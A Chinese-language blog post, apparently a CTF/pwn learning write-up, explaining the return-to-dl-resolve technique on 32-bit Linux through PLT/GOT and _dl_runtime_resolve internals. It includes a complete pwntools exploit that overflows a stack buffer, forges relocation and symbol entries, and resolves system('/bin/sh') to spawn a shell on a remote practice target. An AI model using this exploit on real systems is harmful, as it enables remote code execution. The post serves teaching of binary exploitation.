---
title: return to dl-resolve
date: 2016-10-25 02:09:07
tags:
- stack
- exploit
- return to dl-resolve
categories:
- stack_exploit
---

OK，早就想把return to dl-resolve这种方法记录一下，可是以前觉得这种方法太麻烦，不想搞，就看了下原理，而且具体构造细节有几个地方没懂，所以就耽搁了。但是觉得多掌握一种方法还是有利无害吗，所以今天得空记录一下。

## 利用原理

其实return to dl-resolve利用的就是函数的lazy binding。在此过程中会调用_dl_runtime_roslve函数，然后这个函数会调用fixup()函数来获得函数的地址，并把地址写入相应reloc的r_offset字段(GOT), 然后执行解析的函数。
注：dl-resolve函数其实跟fixup函数实现的是相同的功能，只是在不同glibc中名字不同而已。
<!-- more -->
具体来说第一次调用一个函数的过程是这样的：
1. 跳转到对应的plt项，plt表项的具体内容如下：
```shell
(gdb) x/4i 0x80483f0
   0x80483f0 <write@plt>:	    jmp    *0x804a020
   0x80483f6 <write@plt+6>:	    push   $0x28
   0x80483fb <write@plt+11>:	    jmp    0x8048390
```
2. 然后跳转都相应got项。当然第一次调用时其got表项存放的是相应plt表项的第二条指令的地址。其实又回到了plt表项。
3. 再把相应偏移量push后，然后跳转到PLT[0]，就是上面的第三条指令。第一次push GOT[1]，一个指向link_map结构体的指针，然后跳转到GOT[2]里面存放的地址,即_dl_runtime_resolve函数的地址。然后此函数会把解析得到的函数地址写入reloc项的r_offset字段。最后在_dl_runtime_resolve返回后跳到了相应的函数体执行。PLT[0]存放的内容如下：
```shell
(gdb) x/2i 0x8048390
   0x8048390:	pushl  0x804a004
   0x8048396:	jmp    *0x804a008
```

其实就是函数参数先压栈，然后执行了_dl_runtime_resolve(*link_map, rel_offset)函数。

具体_dl_runtime_resolve函数的具体执行过程如下：
1. 计算函数的reloc entry。
	Elf32_Rel * reloc = JMPREL + reloc_offset;
2. 计算函数的symtab entry。
	Elf32_Sym * sym = &SYMTAB[ ELF32_R_SYM (reloc->r_info) ];
3. security check
	assert (ELF32_R_TYPE(reloc->r_info) == R_386_JMP_SLOT);
4. 计算函数名称在dynstr表中的偏移。
	name = STRTAB + sym->st_name;
5. 函数地址写入相应的项，堆栈调整，执行函数。

由此，攻击思路就是提供一个很大的数rel_offset给_dl_runtime_resolve，使得找到rel_entry落在我们可控制的区域内。同理，构造伪条目，使得所对应的符号信息、符号的名称，均落在我们可控的区域内，那么就可以解析我们所需的函数并调用了。

## 利用举例

我还是用一个[例子](https://github.com/wolfzhang888/pwn_learning/blob/master/stack_skills/dl-resolve)考说明一下吧。以下是相应源码。
```c
int vulnerable_function()
{
  char buf[0x88];

  return read(0, &buf, 0x100u);
}

int main(int argc, const char **argv, const char **envp)
{
  vulnerable_function();
  write(1, "Hello, World!\n", 0xEu);
  return 0;
}
```
以下是exploit：
```python
from pwn import *

debug = 0
if debug:
    context.log_level = 'debug'
    p = process('./dl-resolve')
else:
    p = remote('192.168.175.156', 10000)

elf = ELF('./dl-resolve')
write_plt = elf.plt['write']
read_plt = elf.plt['read']
write_got = elf.got['write']

vuln = 0x0804844b
bss_addr = 0x804a024
base_stage = bss_addr + 0x400
pop3_ret = 0x8048509
pop_ebp_ret = 0x804850b
leave_ret = 0x80483b8
plt_resolve = 0x8048300

payload1  = 'a' * 0x88 + 'b' * 0x4 + p32(read_plt) + p32(pop3_ret)
payload1 += p32(0) + p32(base_stage) +p32(100) + p32(pop_ebp_ret)
payload1 += p32(base_stage) + p32(leave_ret) 
p.sendline(payload1)

rel_plt = 0x80482b0
dynsym_addr = 0x80481cc
dynstr_addr = 0x804822c
index_offset = (base_stage + 28) - rel_plt  #seems like reloc no need to be align, (I've tried many number)
fake_sym = base_stage + 36		    #in the place of '28' can be any number(>=20)
align = 0x10 - ((fake_sym - dynsym_addr) % 0x10)   #but sym's necessary
fake_sym = fake_sym + align
index_dynsym = (fake_sym - dynsym_addr) / 0x10
r_info = (index_dynsym << 8) | 0x7
fake_reloc = p32(write_got) + p32(r_info)
st_name = (fake_sym + 16) - dynstr_addr
fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)

payload2 = 'c' * 4 + p32(plt_resolve) + p32(index_offset) + p32(0xdeadbeef)
payload2 += p32(base_stage + 80) + 'e' * 8 + fake_reloc + 'f' *align
payload2 += fake_sym + 'system\x00'
payload2 = payload2.ljust(80, 'a')
payload2 += '/bin/sh\x00'
payload2 = payload2.ljust(100, 'a')

p.send(payload2)

p.interactive()
```
payload1是为了把伪造条目写到相应区域并把栈调整到该区域，因为执行system函数所需的参数在此区域。payload2主要是为了让_dl_runtime_resolve函数解析system函数并执行。
其实关键还得看_dl_runtime_resolve函数执行时栈的情况, _dl_runtime_resolve的相应汇编如下：
```shell
(gdb) x/11i _dl_runtime_resolve 
   0xb7ff1150 <_dl_runtime_resolve>:    push   %eax
   0xb7ff1151 <_dl_runtime_resolve+1>:  push   %ecx
   0xb7ff1152 <_dl_runtime_resolve+2>:  push   %edx
   0xb7ff1153 <_dl_runtime_resolve+3>:  mov    0x10(%esp),%edx
   0xb7ff1157 <_dl_runtime_resolve+7>:  mov    0xc(%esp),%eax
   0xb7ff115b <_dl_runtime_resolve+11>: call   0xb7feab30 <_dl_fixup>
   0xb7ff1160 <_dl_runtime_resolve+16>: pop    %edx
   0xb7ff1161 <_dl_runtime_resolve+17>: mov    (%esp),%ecx
   0xb7ff1164 <_dl_runtime_resolve+20>: mov    %eax,(%esp)
   0xb7ff1167 <_dl_runtime_resolve+23>: mov    0x4(%esp),%eax
   0xb7ff116b <_dl_runtime_resolve+27>: ret    $0xc
```
在执行_dl_runtime_resolve + 27 时时栈的情况应该是下面这样的：
<img src="http://of38fq57s.bkt.clouddn.com/_dl_runtime_stack.PNG">
```c
|fun's addr|
|eax.......|
|link_map..|
|offset....|
|ret.......|
|arg.......|
|arg.......|
|..........|
```
所以当ret 0xc时就去执行了相应的函数了。以上会执行system函数，最终获得shell。
<img src="http://of38fq57s.bkt.clouddn.com/return2-dl-resolve.PNG">

64位比32位有了些许变化。相关的结构体大小不同，函数参数也变成由寄存器传递而非栈传递。需要注意的是64位还需要泄露link_map的值，目的是将link_map+0x1c8处设为NULL，这样才能绕过相关检测。64位就不举例了，原理都差不多。

## 参考链接

[通过ELF动态装载构造ROP链](http://wooyun.bystudent.com/static/drops/binary-14360.html)

